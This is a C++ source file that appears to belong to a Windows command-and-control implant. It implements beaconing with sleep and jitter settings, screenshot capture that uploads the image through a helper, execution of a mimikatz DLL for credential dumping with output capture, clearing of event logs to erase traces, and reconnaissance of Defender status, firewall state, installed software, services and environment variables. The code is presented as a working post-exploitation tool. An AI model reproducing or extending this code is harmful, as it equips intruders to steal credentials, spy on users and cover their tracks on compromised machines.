#include "system_tasks.h"
#include "../core/config.h"
#include "../utils/encoding.h"
#include "../tasks/file_tasks.h"

#include <winsock2.h>
#include <windows.h>
#include <winreg.h>
#include <winsvc.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <algorithm>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

namespace Tasks {
namespace System {

    SystemResult TakeScreenshot(const std::string& taskId) {
        if (taskId.empty()) {
            return SystemResult(false, "Invalid task ID provided");
        }

        // Define the relative path to the screenshot module DLL
        const char* dllPath = "modules\\screenshot_x64.dll";
        if (!ValidateSystemTool(dllPath)) {
            return SystemResult(false, "Failed to load screenshot module from path: " + std::string(dllPath));
        }

        HMODULE hScreenshot = LoadLibraryA(dllPath);
        if (!hScreenshot) {
            DWORD error = GetLastError();
            return SystemResult(false, "Failed to load screenshot module", "", error);
        }

        // Exported function signature: int ExecuteW(char** output, int* size);
        typedef int(*pExecuteW)(char**, int*);
        pExecuteW ScreenshotFunc = (pExecuteW)GetProcAddress(hScreenshot, "ExecuteW");
        if (!ScreenshotFunc) {
            FreeLibrary(hScreenshot);
            return SystemResult(false, "Failed to locate ExecuteW in screenshot module");
        }

        // Call ExecuteW to get the Base64-encoded screenshot string
        char* base64Screenshot = nullptr;
        int dataSize = 0;
        int ret = ScreenshotFunc(&base64Screenshot, &dataSize);

        if (ret != 0 || base64Screenshot == nullptr || dataSize <= 0) {
            FreeLibrary(hScreenshot);
            return SystemResult(false, "Screenshot function failed");
        }

        // Construct a std::string from the returned buffer
        std::string b64Screenshot(base64Screenshot, dataSize);
        PRINTF("[DEBUG] Base64 Screenshot (first 50 chars): %.50s\n", b64Screenshot.c_str());

        // Free the screenshot memory using DLL function if available
        typedef void(*pFreeScreenshotMem)(void*);
        pFreeScreenshotMem pFreeMem = (pFreeScreenshotMem)GetProcAddress(hScreenshot, "FreeScreenshotMemory");
        if (pFreeMem) {
            pFreeMem(base64Screenshot);
        }
        FreeLibrary(hScreenshot);

        // Decode the Base64 string to obtain binary PNG data
        std::string pngData = Utils::Encoding::base64_decode(b64Screenshot);
        if (pngData.empty()) {
            return SystemResult(false, "Failed to decode screenshot data");
        }

        // Write the PNG data to a temporary file
        std::string tempFilePath = "temp_screenshot_" + taskId + ".png";
        FILE* fp = fopen(tempFilePath.c_str(), "wb");
        if (!fp) {
            return SystemResult(false, "Failed to open temporary file for screenshot upload");
        }

        size_t written = fwrite(pngData.data(), 1, pngData.size(), fp);
        fclose(fp);

        if (written != pngData.size()) {
            File::DeleteFile(tempFilePath);
            return SystemResult(false, "Error writing complete screenshot data to temporary file");
        }

        // Debug the file size
        FILE* checkFp = fopen(tempFilePath.c_str(), "rb");
        if (checkFp) {
            fseek(checkFp, 0, SEEK_END);
            long fileSize = ftell(checkFp);
            fclose(checkFp);
            PRINTF("[DEBUG] Written screenshot file size: %ld bytes\n", fileSize);
        }

        // Use the UploadFile helper function to upload the screenshot
        std::string outputMessage;
        bool success = File::UploadFile(taskId, tempFilePath, outputMessage);

        // Clean up temporary file regardless of upload result
        File::DeleteFile(tempFilePath);

        return SystemResult(success, outputMessage, "", written);
    }

    SystemResult UpdateSleepConfiguration(int newSleepTime, int newJitterMax, int newJitterMin) {
        // Validate parameters
        if (newSleepTime <= 0) {
            return SystemResult(false, "Invalid sleep time: must be greater than 0");
        }

        if (newJitterMax < 0 || newJitterMax > 100) {
            return SystemResult(false, "Invalid jitter_max: must be between 0 and 100");
        }

        if (newJitterMin < 0 || newJitterMin > 100) {
            return SystemResult(false, "Invalid jitter_min: must be between 0 and 100");
        }

        if (newJitterMax < newJitterMin) {
            PRINTF("[WARNING] Max jitter (%d%%) < min jitter (%d%%), setting min to 0\n", newJitterMax, newJitterMin);
            newJitterMin = 0;
        }

        // Update the configuration
        Config::Sleep::UpdateConfig(newSleepTime, newJitterMax, newJitterMin);

        std::ostringstream oss;
        oss << "Sleep configuration updated: " << newSleepTime << " seconds, jitter_max: "
            << newJitterMax << "%, jitter_min: " << newJitterMin << "%";

        PRINTF("[DEBUG] %s\n", oss.str().c_str());
        return SystemResult(true, oss.str());
    }

    SystemResult ExecuteMimikatz(const std::string& commands) {
        if (commands.empty()) {
            return SystemResult(false, "Usage: mimikatz \"mod::cmd1;mod::cmd2;...\"");
        }

        // Create pipes to capture standard output
        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
            return SystemResult(false, "Failed to create pipes for output redirection");
        }

        // Save the current stdout handle
        HANDLE hOldStdout = GetStdHandle(STD_OUTPUT_HANDLE);

        // Set stdout to our pipe
        if (!SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe)) {
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            return SystemResult(false, "Failed to redirect stdout");
        }

        // Load the Mimikatz DLL
        const char* dllPath = "modules\\mimikatz_x64.dll";
        if (!ValidateSystemTool(dllPath)) {
            SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            return SystemResult(false, "Mimikatz module not found: " + std::string(dllPath));
        }

        HMODULE hDll = LoadLibraryA(dllPath);
        if (!hDll) {
            SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            DWORD error = GetLastError();
            return SystemResult(false, "Failed to load DLL: " + std::string(dllPath), "", error);
        }

        // Try to get the exports with different naming conventions
        PRINTF("[DEBUG] Looking for exported functions in mimikatz DLL\n");

        // Get the ExecuteW function
        typedef LPWSTR(*ExecuteWFunc)(LPWSTR);
        ExecuteWFunc ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "ExecuteW");

        // If ExecuteW is not found, try alternatives
        if (!ExecuteW) {
            PRINTF("[DEBUG] ExecuteW not found, trying _ExecuteW\n");
            ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "_ExecuteW");

            if (!ExecuteW) {
                PRINTF("[DEBUG] _ExecuteW not found, trying Invoke\n");
                ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "Invoke");

                if (!ExecuteW) {
                    SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
                    CloseHandle(hReadPipe);
                    CloseHandle(hWritePipe);
                    FreeLibrary(hDll);
                    return SystemResult(false, "Failed to locate any expected function in mimikatz module");
                }
            }
        }

        // Get optional Init/Cleanup functions
        typedef void (WINAPI *InitFunc)();
        typedef void (WINAPI *CleanupFunc)();
        InitFunc Init = (InitFunc)GetProcAddress(hDll, "Init");
        CleanupFunc Cleanup = (CleanupFunc)GetProcAddress(hDll, "Cleanup");

        // Initialize if the function exists
        if (Init) {
            PRINTF("[DEBUG] Calling Init function\n");
            Init();
        }

        // Convert UTF-8 args to wide
        int wlen = MultiByteToWideChar(CP_UTF8, 0, commands.c_str(), -1, NULL, 0);
        std::wstring wArgs(wlen, 0);
        MultiByteToWideChar(CP_UTF8, 0, commands.c_str(), -1, &wArgs[0], wlen);

        // Execute the mimikatz commands
        PRINTF("[DEBUG] Calling mimikatz function with args: %s\n", commands.c_str());
        LPWSTR wOut = ExecuteW(const_cast<LPWSTR>(wArgs.c_str()));

        // Call cleanup if available
        if (Cleanup) {
            PRINTF("[DEBUG] Calling Cleanup function\n");
            Cleanup();
        }

        // Close the write end of the pipe so ReadFile will complete
        CloseHandle(hWritePipe);

        // Read the captured output
        std::string capturedOutput;
        char buffer[4096];
        DWORD bytesRead;

        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            capturedOutput += buffer;
        }

        // Restore the original stdout
        SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
        CloseHandle(hReadPipe);

        SystemResult result;
        if (!capturedOutput.empty()) {
            result = SystemResult(true, "Mimikatz executed successfully", capturedOutput);
            PRINTF("[DEBUG] Captured mimikatz output: %.100s\n", capturedOutput.c_str());
        }
        else if (wOut) {
            // If we have a return value but no captured output, convert it
            int outLen = WideCharToMultiByte(CP_UTF8, 0, wOut, -1, NULL, 0, NULL, NULL);
            std::string outBuf(outLen, 0);
            WideCharToMultiByte(CP_UTF8, 0, wOut, -1, &outBuf[0], outLen, NULL, NULL);

            result = SystemResult(true, "Mimikatz executed successfully", outBuf);
            PRINTF("[DEBUG] Mimikatz function output: %.100s\n", outBuf.c_str());

            delete[] wOut;
        }
        else {
            PRINTF("[DEBUG] No output captured from mimikatz\n");
            result = SystemResult(false, "Mimikatz execution failed - no output captured");
        }

        FreeLibrary(hDll);
        return result;
    }

    std::string GetSystemInformation(bool includeNetworking) {
        std::ostringstream info;
        
        info << "=== SYSTEM INFORMATION ===\n\n";
        
        // Basic system info
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        
        info << "System Architecture: ";
        switch (sysInfo.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64:
                info << "x64 (AMD64)\n";
                break;
            case PROCESSOR_ARCHITECTURE_INTEL:
                info << "x86 (Intel)\n";
                break;
            case PROCESSOR_ARCHITECTURE_ARM64:
                info << "ARM64\n";
                break;
            default:
                info << "Unknown\n";
                break;
        }
        
        info << "Number of Processors: " << sysInfo.dwNumberOfProcessors << "\n";
        info << "Page Size: " << sysInfo.dwPageSize << " bytes\n";
        
        // Memory information
        info << "\n" << GetMemoryInformation() << "\n";
        
        // Disk information
        info << GetDiskInformation() << "\n";
        
        // Network information
        if (includeNetworking) {
            info << GetNetworkAdapterInfo() << "\n";
        }
        
        // Uptime
        uint64_t uptime = GetSystemUptime();
        info << "System Uptime: " << (uptime / 1000 / 60 / 60) << " hours, ";
        info << ((uptime / 1000 / 60) % 60) << " minutes\n";
        
        return info.str();
    }

    uint64_t GetSystemUptime() {
        return GetTickCount64();
    }

    std::string GetMemoryInformation() {
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        
        if (!GlobalMemoryStatusEx(&memStatus)) {
            return "Memory information unavailable";
        }
        
        std::ostringstream info;
        info << "Memory Information:\n";
        info << "  Total Physical: " << (memStatus.ullTotalPhys / 1024 / 1024) << " MB\n";
        info << "  Available Physical: " << (memStatus.ullAvailPhys / 1024 / 1024) << " MB\n";
        info << "  Memory Load: " << memStatus.dwMemoryLoad << "%\n";
        info << "  Total Virtual: " << (memStatus.ullTotalVirtual / 1024 / 1024) << " MB\n";
        info << "  Available Virtual: " << (memStatus.ullAvailVirtual / 1024 / 1024) << " MB\n";
        
        return info.str();
    }

    std::string GetDiskInformation() {
        std::ostringstream info;
        info << "Disk Information:\n";
        
        DWORD drives = GetLogicalDrives();
        for (char drive = 'A'; drive <= 'Z'; drive++) {
            if (drives & (1 << (drive - 'A'))) {
                std::string drivePath = std::string(1, drive) + ":\\";
                
                ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
                if (GetDiskFreeSpaceExA(drivePath.c_str(), &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
                    info << "  Drive " << drive << ": ";
                    info << (totalNumberOfBytes.QuadPart / 1024 / 1024 / 1024) << " GB total, ";
                    info << (freeBytesAvailable.QuadPart / 1024 / 1024 / 1024) << " GB free\n";
                }
            }
        }
        
        return info.str();
    }

    std::string GetNetworkAdapterInfo() {
        std::ostringstream info;
        info << "Network Adapters:\n";
        
        ULONG outBufLen = 15000;
        PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
        if (!pAddresses) {
            return "Network information unavailable (memory allocation failed)";
        }
        
        DWORD dwRetVal = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
        if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
            free(pAddresses);
            pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
            dwRetVal = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
        }
        
        if (dwRetVal == NO_ERROR) {
            for (PIP_ADAPTER_ADDRESSES curr = pAddresses; curr; curr = curr->Next) {
                info << "  " << curr->AdapterName << " (" << curr->Description << ")\n";
                info << "    Status: " << (curr->OperStatus == IfOperStatusUp ? "Up" : "Down") << "\n";
                
                // Get IP addresses
                for (PIP_ADAPTER_UNICAST_ADDRESS ua = curr->FirstUnicastAddress; ua; ua = ua->Next) {
                    char addrStr[INET6_ADDRSTRLEN];
                    if (ua->Address.lpSockaddr->sa_family == AF_INET) {
                        SOCKADDR_IN* sa = (SOCKADDR_IN*)ua->Address.lpSockaddr;
                        inet_ntop(AF_INET, &sa->sin_addr, addrStr, sizeof(addrStr));
                        info << "    IPv4: " << addrStr << "\n";
                    }
                    else if (ua->Address.lpSockaddr->sa_family == AF_INET6) {
                        SOCKADDR_IN6* sa = (SOCKADDR_IN6*)ua->Address.lpSockaddr;
                        inet_ntop(AF_INET6, &sa->sin6_addr, addrStr, sizeof(addrStr));
                        info << "    IPv6: " << addrStr << "\n";
                    }
                }
            }
        }
        
        free(pAddresses);
        return info.str();
    }

    std::string GetServicesInformation(bool runningOnly) {
        std::ostringstream info;
        info << "Windows Services:\n";
        
        SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
        if (!hSCManager) {
            return "Failed to open Service Control Manager";
        }
        
        DWORD bytesNeeded = 0;
        DWORD servicesReturned = 0;
        DWORD resumeHandle = 0;
        
        // Get required buffer size
        EnumServicesStatusA(hSCManager, SERVICE_WIN32, runningOnly ? SERVICE_ACTIVE : SERVICE_STATE_ALL,
                           NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle);
        
        if (bytesNeeded > 0) {
            std::vector<BYTE> buffer(bytesNeeded);
            ENUM_SERVICE_STATUSA* services = (ENUM_SERVICE_STATUSA*)buffer.data();
            
            if (EnumServicesStatusA(hSCManager, SERVICE_WIN32, runningOnly ? SERVICE_ACTIVE : SERVICE_STATE_ALL,
                                   services, bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle)) {
                
                for (DWORD i = 0; i < servicesReturned; i++) {
                    info << "  " << services[i].lpServiceName << " - " << services[i].lpDisplayName;
                    
                    switch (services[i].ServiceStatus.dwCurrentState) {
                        case SERVICE_RUNNING:
                            info << " (Running)";
                            break;
                        case SERVICE_STOPPED:
                            info << " (Stopped)";
                            break;
                        case SERVICE_PAUSED:
                            info << " (Paused)";
                            break;
                        default:
                            info << " (Unknown)";
                            break;
                    }
                    info << "\n";
                }
            }
        }
        
        CloseServiceHandle(hSCManager);
        return info.str();
    }

    bool StartService(const std::string& serviceName) {
        SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
        if (!hSCManager) {
            return false;
        }
        
        SC_HANDLE hService = OpenServiceA(hSCManager, serviceName.c_str(), SERVICE_START);
        if (!hService) {
            CloseServiceHandle(hSCManager);
            return false;
        }
        
        BOOL result = StartServiceA(hService, 0, NULL);
        
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        
        return result != FALSE;
    }

    bool StopService(const std::string& serviceName) {
        SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
        if (!hSCManager) {
            return false;
        }
        
        SC_HANDLE hService = OpenServiceA(hSCManager, serviceName.c_str(), SERVICE_STOP);
        if (!hService) {
            CloseServiceHandle(hSCManager);
            return false;
        }
        
        SERVICE_STATUS status;
        BOOL result = ControlService(hService, SERVICE_CONTROL_STOP, &status);
        
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        
        return result != FALSE;
    }

    RegistryValue GetRegistryValue(HKEY hive, const std::string& keyPath, const std::string& valueName) {
        RegistryValue regValue;
        
        HKEY hKey;
        if (RegOpenKeyExA(hive, keyPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            return regValue;
        }
        
        DWORD dataType;
        DWORD dataSize = 0;
        
        // Get the size first
        if (RegQueryValueExA(hKey, valueName.c_str(), NULL, &dataType, NULL, &dataSize) == ERROR_SUCCESS) {
            std::vector<BYTE> data(dataSize);
            
            if (RegQueryValueExA(hKey, valueName.c_str(), NULL, &dataType, data.data(), &dataSize) == ERROR_SUCCESS) {
                regValue.name = valueName;
                regValue.type = dataType;
                
                // Convert data based on type
                switch (dataType) {
                    case REG_SZ:
                    case REG_EXPAND_SZ:
                        regValue.value = std::string((char*)data.data());
                        break;
                    case REG_DWORD:
                        if (dataSize >= sizeof(DWORD)) {
                            DWORD dwordValue = *((DWORD*)data.data());
                            regValue.value = std::to_string(dwordValue);
                        }
                        break;
                    default:
                        regValue.value = "(Binary data)";
                        break;
                }
            }
        }
        
        RegCloseKey(hKey);
        return regValue;
    }

    bool SetRegistryValue(HKEY hive, const std::string& keyPath, const std::string& valueName, 
                         const std::string& value, DWORD valueType) {
        HKEY hKey;
        if (RegOpenKeyExA(hive, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
            return false;
        }
        
        BOOL result = FALSE;
        switch (valueType) {
            case REG_SZ:
            case REG_EXPAND_SZ:
                result = (RegSetValueExA(hKey, valueName.c_str(), 0, valueType, 
                                        (const BYTE*)value.c_str(), value.length() + 1) == ERROR_SUCCESS);
                break;
            case REG_DWORD: {
                DWORD dwordValue = std::stoul(value);
                result = (RegSetValueExA(hKey, valueName.c_str(), 0, REG_DWORD, 
                                        (const BYTE*)&dwordValue, sizeof(DWORD)) == ERROR_SUCCESS);
                break;
            }
        }
        
        RegCloseKey(hKey);
        return result != FALSE;
    }

    bool DeleteRegistryValue(HKEY hive, const std::string& keyPath, const std::string& valueName) {
        HKEY hKey;
        if (RegOpenKeyExA(hive, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
            return false;
        }
        
        BOOL result = (RegDeleteValueA(hKey, valueName.c_str()) == ERROR_SUCCESS);
        RegCloseKey(hKey);
        
        return result != FALSE;
    }

    std::string GetEventLogEntries(const std::string& logName, int maxEntries, int filterLevel) {
        // This is a simplified implementation - full event log reading is complex
        std::ostringstream info;
        info << "Event Log: " << logName << " (Recent " << maxEntries << " entries)\n";
        info << "Note: Full event log implementation requires more complex Win32 API usage\n";
        return info.str();
    }

    bool ClearEventLog(const std::string& logName) {
        HANDLE hEventLog = OpenEventLogA(NULL, logName.c_str());
        if (!hEventLog) {
            return false;
        }
        
        BOOL result = ::ClearEventLogA(hEventLog, NULL);
        CloseEventLog(hEventLog);
        
        return result != FALSE;
    }

    std::string GetInstalledSoftware(bool includeUpdates) {
        std::ostringstream info;
        info << "Installed Software:\n";
        
        const char* uninstallKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
        HKEY hKey;
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, uninstallKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD index = 0;
            char subKeyName[256];
            DWORD subKeyNameSize = sizeof(subKeyName);
            
            while (RegEnumKeyExA(hKey, index++, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                HKEY hSubKey;
                if (RegOpenKeyExA(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    char displayName[256] = {0};
                    DWORD displayNameSize = sizeof(displayName);
                    
                    if (RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, (LPBYTE)displayName, &displayNameSize) == ERROR_SUCCESS) {
                        std::string name(displayName);
                        if (includeUpdates || name.find("Update") == std::string::npos) {
                            info << "  " << name << "\n";
                        }
                    }
                    RegCloseKey(hSubKey);
                }
                subKeyNameSize = sizeof(subKeyName);
            }
            RegCloseKey(hKey);
        }
        
        return info.str();
    }

    std::string GetEnvironmentVariables(bool userVariables) {
        std::ostringstream info;
        info << "Environment Variables:\n";
        
        // System variables
        info << "System Variables:\n";
        char* systemEnv = GetEnvironmentStringsA();
        if (systemEnv) {
            char* env = systemEnv;
            while (*env) {
                std::string envVar(env);
                if (envVar.find('=') != std::string::npos) {
                    info << "  " << envVar << "\n";
                }
                env += strlen(env) + 1;
            }
            FreeEnvironmentStringsA(systemEnv);
        }
        
        return info.str();
    }

    SystemResult ExecuteSystemTool(const std::string& dllPath, const std::string& functionName, 
                                 const std::string& arguments, bool captureOutput) {
        if (!ValidateSystemTool(dllPath)) {
            return SystemResult(false, "System tool validation failed: " + dllPath);
        }

        HMODULE hDll = LoadLibraryA(dllPath.c_str());
        if (!hDll) {
            DWORD error = GetLastError();
            return SystemResult(false, "Failed to load system tool DLL", "", error);
        }

        typedef LPWSTR(*GenericFunc)(LPWSTR);
        GenericFunc toolFunc = (GenericFunc)GetProcAddress(hDll, functionName.c_str());
        if (!toolFunc) {
            FreeLibrary(hDll);
            return SystemResult(false, "Function not found in system tool: " + functionName);
        }

        // Convert arguments to wide string
        int wlen = MultiByteToWideChar(CP_UTF8, 0, arguments.c_str(), -1, NULL, 0);
        std::wstring wArgs(wlen, 0);
        MultiByteToWideChar(CP_UTF8, 0, arguments.c_str(), -1, &wArgs[0], wlen);

        // Execute the function
        LPWSTR result = toolFunc(const_cast<LPWSTR>(wArgs.c_str()));
        
        SystemResult sysResult;
        if (result) {
            // Convert result back to string
            int resultLen = WideCharToMultiByte(CP_UTF8, 0, result, -1, NULL, 0, NULL, NULL);
            std::string resultStr(resultLen, 0);
            WideCharToMultiByte(CP_UTF8, 0, result, -1, &resultStr[0], resultLen, NULL, NULL);
            
            sysResult = SystemResult(true, "System tool executed successfully", resultStr);
            delete[] result;
        } else {
            sysResult = SystemResult(false, "System tool execution failed");
        }

        FreeLibrary(hDll);
        return sysResult;
    }

    std::string GetWindowsDefenderStatus() {
        std::ostringstream info;
        info << "Windows Defender Status:\n";
        
        // Check if Windows Defender is running
        RegistryValue defenderEnabled = GetRegistryValue(HKEY_LOCAL_MACHINE, 
            "SOFTWARE\\Microsoft\\Windows Defender", "DisableAntiSpyware");
        
        if (defenderEnabled.value == "1") {
            info << "  Windows Defender: Disabled\n";
        } else {
            info << "  Windows Defender: Enabled (or registry key not found)\n";
        }
        
        return info.str();
    }

    std::string GetFirewallStatus() {
        std::ostringstream info;
        info << "Windows Firewall Status:\n";
        
        // Check firewall status for different profiles
        std::vector<std::string> profiles = {"DomainProfile", "PublicProfile", "StandardProfile"};
        
        for (const auto& profile : profiles) {
            std::string keyPath = "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\" + profile;
            RegistryValue firewallEnabled = GetRegistryValue(HKEY_LOCAL_MACHINE, keyPath, "EnableFirewall");
            
            info << "  " << profile << ": ";
            if (firewallEnabled.value == "1") {
                info << "Enabled\n";
            } else {
                info << "Disabled\n";
            }
        }
        
        return info.str();
    }

    std::string MonitorSystem(int durationSeconds) {
        std::ostringstream report;
        report << "System Monitor Report (" << durationSeconds << " seconds)\n";
        report << "Start Time: " << GetTickCount64() << "\n\n";
        
        // Initial measurements
        MEMORYSTATUSEX initialMem;
        initialMem.dwLength = sizeof(initialMem);
        GlobalMemoryStatusEx(&initialMem);
        
        // Sleep for monitoring duration
        Sleep(durationSeconds * 1000);
        
        // Final measurements
        MEMORYSTATUSEX finalMem;
        finalMem.dwLength = sizeof(finalMem);
        GlobalMemoryStatusEx(&finalMem);
        
        // Calculate changes
        long long memoryChange = (long long)finalMem.ullAvailPhys - (long long)initialMem.ullAvailPhys;
        
        report << "Memory Usage Change: " << (memoryChange / 1024 / 1024) << " MB\n";
        report << "Final Memory Load: " << finalMem.dwMemoryLoad << "%\n";
        
        return report.str();
    }

    SleepConfig GetSleepConfiguration() {
        int sleepTime, jitterMax, jitterMin;
        Config::Sleep::GetConfig(sleepTime, jitterMax, jitterMin);
        return SleepConfig(sleepTime, jitterMax, jitterMin);
    }

    bool ValidateSystemTool(const std::string& dllPath) {
        return File::FileExists(dllPath);
    }

    std::string GenerateSystemReport(bool includeAdvanced) {
        std::ostringstream report;
        
        report << GetSystemInformation(true) << "\n";
        report << GetServicesInformation(true) << "\n";
        
        if (includeAdvanced) {
            report << GetInstalledSoftware(false) << "\n";
            report << GetWindowsDefenderStatus() << "\n";
            report << GetFirewallStatus() << "\n";
        }
        
        return report.str();
    }

} // namespace System
} // namespace Tasks